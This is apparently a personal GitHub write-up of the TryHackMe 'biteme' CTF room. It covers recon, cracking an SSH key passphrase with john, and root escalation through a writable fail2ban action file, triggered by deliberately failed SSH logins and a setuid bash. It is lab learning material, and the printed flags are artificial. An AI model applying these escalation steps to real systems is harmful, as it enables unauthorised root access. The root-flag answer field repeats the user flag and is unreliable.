<h1 align="center">biteme</h1>
<p align="center">July 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>450</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Stay out of my server!</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/5e69b3ca-13a8-4899-ac1c-070a2c5b2aa"><br>
Click <a href="https://tryhackme.com/room/biteme">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/64702677-4bf1-4d3a-9f6f-f78d60422b84"></p>

<br>

<h2>Task 1 . Take a bite</h2>
<p>Start the machine and get the flags...</p>



<p><em>Answer the questions below</em></p>

<p>1.1.What is the user flag?<br>
<code>THM{6fbf1fb7241dac060cd3abba70c33070}</code></p>




<h3>Nmap</h3>


```bash
:~/biteme# nmap -sC -sV -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```


<h3>/etc/hosts</h3>

```bash
TargetIP   biteme
```

<h3>dirsearch</h3>

```bash
:~/biteme# dirsearch -u http://biteme
...
[xx:xx:xx] 301 -  316B  - /console  ->  http://biteme/console/
[xx:xx:xx] 200 -    2KB - /console/
```

```bash
:~/biteme# dirsearch -u http://biteme/console -e txt,php,html,phps -x 403
...
[xx:xx:xx] Starting: console/
[xx:xx:xx] 200 -    0B  - /console/config.php
[xx:xx:xx] 301 -  320B  - /console/css  ->  http:/biteme/console/css/
[xx:xx:xx] 302 -    0B  - /console/dashboard.php  ->  index.php
[xx:xx:xx] 200 -   25B  - /console/robots.txt
```

```bash
:~/biteme# dirsearch -u http://biteme/console/ -e .phps -x 403
...

```

<br>

<h3>Web</h3>

<img width="922" height="230" alt="image" src="https://github.com/user-attachments/assets/60a9a5fe-aecd-4d53-bb47-6707b0bcbaa0" />

<h3>/console</h3>

<img width="906" height="291" alt="image" src="https://github.com/user-attachments/assets/f564014d-1276-4e67-a9a9-c16c6c961d90" />

<img width="1368" height="396" alt="image" src="https://github.com/user-attachments/assets/d2f5cfaa-5f3d-447b-ae59-6149748a0169" />



<h3>/console/robots.txt</h3>

<img width="918" height="61" alt="image" src="https://github.com/user-attachments/assets/054284d8-4496-476e-85d6-01c7c19c3304" />


<br>

<h3>Burp Suite and FoxyProxy</h3>

<img width="845" height="232" alt="image" src="https://github.com/user-attachments/assets/49d74079-8406-48e0-92ee-ba300748c80a" />

<h3>/console</h3>

<img width="841" height="178" alt="image" src="https://github.com/user-attachments/assets/71b2bf72-a87b-4dbb-a6dc-09b2773212e4" />

<h3>/console/securimage</h3>

<img width="937" height="498" alt="image" src="https://github.com/user-attachments/assets/3d3e14a4-5a6e-4e4d-ad28-8d7fae18458e" />

<h3>/console/securimage/README.txt</h3>

<img width="931" height="559" alt="image" src="https://github.com/user-attachments/assets/22ffd3c1-ac49-4992-ae83-ffd2a3671789" />

<h3>/console/securimage/words/</h3>

<img width="932" height="174" alt="image" src="https://github.com/user-attachments/assets/953ee7e3-6c9c-45ba-bc30-e38cd8fbca6e" />


<h3>words.tst</h3>

```bash
:~/biteme#wget http://biteme/console/securimage/words/words.txt
```


```bash
:~/biteme# php -a
Interactive mode enabled

php > echo hex2bin('6a61736f6e5f746573745f6163636f756e74');
jason_test_account
php >
```

```bash

```


```bash
:~/biteme# nano este
:~/biteme#chmod 600 este
:~/biteme#locate ssh2john
/opt/john/ssh2john.py
:~/biteme# john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
1a2b3c4d         (este)
```


```bash
:~/biteme# ssh -i este jason@biteme
...
jason@biteme:~$ pwd
/home/jason
jason@biteme:~$ ls
user.txt
jason@biteme:~$ cat user.txt
THM{6fbf1fb7241dac060cd3abba70c33070}
```

<br>

<p>1.1.What is the root flag?<br>
<code>THM{6fbf1fb7241dac060cd3abba70c33070}</code></p>


```bash
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on ip-TargetIP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on ip-TargetIP:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

```bash
jason@biteme:~$ sudo -u fred bash
fred@biteme:/home/jason$ cd ..
fred@biteme:/home$ cd fred
fred@ibiteme:~$ ls
fred@biteme:~$ sudo -l
...
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-10-167-196:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
fred@biteme:~$ 
```

```bash
fred@biteme:~$ cat /etc/fail2ban/jail.local
[sshd]
enabled   = true
maxretry  = 3
findtime  = 2m
bantime   = 2m
banaction = iptables-multiport
fred@biteme:~$ ls -lah /etc/fail2ban/action.d
total 304K
drwxrwxrwx 2 root root  12K Apr 26 14:36 .
drwxr-xr-x 6 root root 4.0K Apr 26 14:36 ..
-rw-r--r-- 1 root root 3.8K Jan 11  2020 abuseipdb.conf
-rw-r--r-- 1 root root  587 Jan 18  2018 apf.conf
-rw-r--r-- 1 root root  629 Jan 18  2018 badips.conf
-rw-r--r-- 1 root root  12K Jan 11  2020 badips.py
-rw-r--r-- 1 root root 2.7K Jan 11  2020 blocklist_de.conf
-rw-r--r-- 1 root root 3.2K Jan 11  2020 bsd-ipfw.conf
-rw-r--r-- 1 root root 2.8K Jan 11  2020 cloudflare.conf
-rw-r--r-- 1 root root 4.7K Jan 11  2020 complain.conf
-rw-r--r-- 1 root root 7.5K Jan 11  2020 dshield.conf
-rw-r--r-- 1 root root 1.7K Jan 11  2020 dummy.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 firewallcmd-allports.conf
-rw-r--r-- 1 root root 2.6K Jan 18  2018 firewallcmd-common.conf
-rw-r--r-- 1 root root 2.3K Jan 11  2020 firewallcmd-ipset.conf
-rw-r--r-- 1 root root 1.3K Jan 18  2018 firewallcmd-multiport.conf
-rw-r--r-- 1 root root 1.9K Jan 18  2018 firewallcmd-new.conf
-rw-r--r-- 1 root root 2.3K Jan 18  2018 firewallcmd-rich-logging.conf
-rw-r--r-- 1 root root 1.8K Jan 18  2018 firewallcmd-rich-rules.conf
-rw-r--r-- 1 root root  592 Jan 11  2020 helpers-common.conf
-rw-r--r-- 1 root root 1.7K Jan 11  2020 hostsdeny.conf
-rw-r--r-- 1 root root 1.6K Jan 11  2020 ipfilter.conf
-rw-r--r-- 1 root root 1.5K Jan 11  2020 ipfw.conf
-rw-r--r-- 1 root root 1.5K Jan 11  2020 iptables-allports.conf
-rw-r--r-- 1 root root 2.7K Jan 18  2018 iptables-common.conf
-rw-r--r-- 1 root root 2.1K Jan 11  2020 iptables-ipset-proto4.conf
-rw-r--r-- 1 root root 2.3K Jan 11  2020 iptables-ipset-proto6-allports.conf
-rw-r--r-- 1 root root 2.4K Jan 11  2020 iptables-ipset-proto6.conf
-rw-r--r-- 1 root root 2.2K Jan 11  2020 iptables-multiport-log.conf
-rw-r--r-- 1 fred root 1.5K Jan 11  2020 iptables-multiport.conf
-rw-r--r-- 1 root root 1.6K Jan 11  2020 iptables-new.conf
-rw-r--r-- 1 root root 2.7K Jan 11  2020 iptables-xt_recent-echo.conf
-rw-r--r-- 1 root root 1.4K Jan 11  2020 iptables.conf
-rw-r--r-- 1 root root 2.4K Jan 11  2020 mail-buffered.conf
-rw-r--r-- 1 root root 1.1K Jan 11  2020 mail-whois-common.conf
-rw-r--r-- 1 root root 2.4K Jan 11  2020 mail-whois-lines.conf
-rw-r--r-- 1 root root 1.8K Jan 11  2020 mail-whois.conf
-rw-r--r-- 1 root root 1.7K Jan 11  2020 mail.conf
-rw-r--r-- 1 root root 5.2K Jan 11  2020 mynetwatchman.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 netscaler.conf
-rw-r--r-- 1 root root  383 Jan 11  2020 nftables-allports.conf
-rw-r--r-- 1 root root 4.0K Jan 18  2018 nftables-common.conf
-rw-r--r-- 1 root root  384 Jan 11  2020 nftables-multiport.conf
-rw-r--r-- 1 root root 6.2K Jan 11  2020 nftables.conf
-rw-r--r-- 1 root root 3.7K Jan 11  2020 nginx-block-map.conf
-rw-r--r-- 1 root root 1.5K Jan 11  2020 npf.conf
-rw-r--r-- 1 root root 3.2K Jan 11  2020 nsupdate.conf
-rw-r--r-- 1 root root  497 Jan 11  2020 osx-afctl.conf
-rw-r--r-- 1 root root 2.3K Jan 11  2020 osx-ipfw.conf
-rw-r--r-- 1 root root 3.7K Jan 11  2020 pf.conf
-rw-r--r-- 1 root root 1023 Jan 18  2018 route.conf
-rw-r--r-- 1 root root 2.8K Jan 11  2020 sendmail-buffered.conf
-rw-r--r-- 1 root root 1.9K Jan 11  2020 sendmail-common.conf
-rw-r--r-- 1 root root 1.8K Jan 11  2020 sendmail-geoip-lines.conf
-rw-r--r-- 1 root root 1.1K Jan 11  2020 sendmail-whois-ipjailmatches.conf
-rw-r--r-- 1 root root 1.1K Jan 11  2020 sendmail-whois-ipmatches.conf
-rw-r--r-- 1 root root 1.3K Jan 11  2020 sendmail-whois-lines.conf
-rw-r--r-- 1 root root 1000 Jan 11  2020 sendmail-whois-matches.conf
-rw-r--r-- 1 root root  950 Jan 11  2020 sendmail-whois.conf
-rw-r--r-- 1 root root  829 Jan 11  2020 sendmail.conf
-rw-r--r-- 1 root root 3.1K Jan 11  2020 shorewall-ipset-proto6.conf
-rw-r--r-- 1 root root 2.2K Jan 11  2020 shorewall.conf
-rw-r--r-- 1 root root 6.2K Jan 11  2020 smtp.py
-rw-r--r-- 1 root root 1.4K Jan 11  2020 symbiosis-blacklist-allports.conf
-rw-r--r-- 1 root root 1.1K Jan 18  2018 ufw.conf
-rw-r--r-- 1 root root 6.3K Jan 11  2020 xarf-login-attack.conf
```


```bash
fred@biteme:~$ ls -lah /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 fred root 1.4K Nov 13  2021 /etc/fail2ban/action.d/iptables-multiport.conf
```


```bash
fred@biteme:~$ cat /etc/fail2ban/action.d/iptables-multiport.conf
```

```bash
fred@biteme:~$ nano /etc/fail2ban/action.d/iptables-multiport.conf
```



<img width="795" height="391" alt="image" src="https://github.com/user-attachments/assets/df76ec3f-97aa-4f9d-a4e6-989a91c922e3" />



```bash
fred@biteme:/etc/fail2ban$ cat jail.local
[sshd]
enabled   = true
maxretry  = 3
findtime  = 2m
bantime   = 2m
banaction = iptables-multiport
```


```bash
fred@biteme:~$ sudo systemctl restart fail2ban
fred@biteme:~$ exit
exit
jason@biteme:~$ logout
```


```bash
:~/biteme# ssh fred@TargetIP
fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@1biteme's password: 
fred@biteme: Permission denied (publickey,password).
```


```bash
:~/biteme# ssh fred@TargetIP
fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@1biteme's password: 
fred@biteme: Permission denied (publickey,password).
```


```bash
:~/biteme# ssh fred@TargetIP
fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@biteme's password: 
Permission denied, please try again.
:~/biteme# fred@1biteme's password: 
fred@biteme: Permission denied (publickey,password).
```


```bash
:~/biteme# ssh -i este jason@biteme
Enter passphrase for key 'este': 
...
jason@biteme:~$ pwd
/home/jason
jason@biteme:~$ cd /etc
jason@biteme:/etc$ cd fail2ban
jason@biteme:/etc/fail2ban$ cd action.d
jason@biteme:/etc/fail2ban/action.d$ sudo -u fred sudo /bin/systemctl restart fail2ban
jason@ibiteme:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
jason@biteme:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
jason@biteme:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
jason@biteme:/etc/fail2ban/action.d$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{0e355b5c907ef7741f40f4a41cc6678d}
```

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/8ec68533-760f-4388-a8b9-28fd05ae51e4"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/d1933ff2-37d1-4402-8f44-53787545ca04"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 30, 2025     | 450      |     143ʳᵈ    |      5ᵗʰ     |     122ⁿᵈ   |     7ᵗʰ    | 118,140  |    885    |    72     |


</div>

<p align="center">Global All Time:   143ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/a1f42512-51ff-4d83-8fc0-b7f5eda866b9"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/48db1840-5233-4c6d-be05-1ddad29b1c0e"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/185c530e-3305-43fb-a298-1fd58e8bc8e52"><br>
                  Global monthly:    122ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/c55418ed-39dc-4e89-9592-cba4b3b20bfc"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/69645aa9-2e9e-4bef-824b-25a7e3d46074"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
